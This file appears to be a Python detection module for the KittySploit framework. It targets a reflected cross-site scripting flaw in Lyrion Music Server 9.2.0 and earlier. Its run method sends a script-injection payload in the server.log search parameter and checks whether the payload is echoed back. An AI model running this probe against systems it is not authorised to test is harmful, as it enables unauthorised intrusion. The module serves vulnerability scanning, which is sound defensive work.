#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Lyrion Music Server 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Lyrion Music Server <= 9.2.0 - Cross-Site Scripting Detection',
        'description': "Lyrion Music Server 9.2.0 contains a reflected XSS caused by improper sanitization of the search parameter in the server.log endpoint, letting unauthenticated attackers execute arbitrary script in users' browsers.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'lyrion', 'lms', 'xss', 'reflected', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.zeroscience.mk/#/advisories/ZSL-2026-5988',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-50230',
            'https://www.lyrion.org',
        ],
        'cve': 'CVE-2026-50230',
    }

    def run(self):
        path = '/jsonrpc.js'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"id":1,"method":"slim.request","params":[0,["version","?"]]}\n')
        if not r:
            return False
        path = '/server.log?search=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Lyrion Music Server <= 9.2.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

